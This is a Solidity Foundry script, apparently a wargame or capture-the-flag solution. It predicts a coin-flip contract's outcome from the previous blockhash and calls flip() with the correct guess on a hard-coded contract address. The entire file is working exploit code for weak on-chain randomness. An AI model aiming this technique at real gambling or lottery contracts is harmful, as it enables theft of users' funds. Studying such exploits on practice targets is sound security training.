// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";

contract CoinFlipScript is Script {
    function setUp() public {}

    function run() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IExpose attack = IExpose(0xc136FFfc7CF9BadA5a75b4a633399F803da20877);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        attack.flip(side);

        vm.stopBroadcast();
        
    }
}

interface IExpose {
   function flip(bool _guess) external returns (bool);
}
